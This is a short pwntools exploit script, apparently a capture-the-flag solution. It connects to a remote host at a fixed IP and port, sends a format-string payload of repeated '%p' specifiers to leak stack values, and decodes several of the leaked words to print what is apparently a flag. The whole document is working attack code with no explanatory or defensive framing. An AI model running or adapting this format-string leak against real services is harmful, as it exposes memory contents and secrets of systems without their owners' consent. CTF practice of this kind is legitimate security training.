from pwn import *

def un(s):
    return unhex(s[2:])[::-1]

r = remote('140.110.112.77', 4001)
r.recvuntil(':D')
r.sendline('%p %p %p %p %p %p %p %p %p %p')
res = r.recvall(1).split(' ')

print(un(res[6]) + un(res[7]) + un(res[8]) + un(res[9]) + un(res[10]))
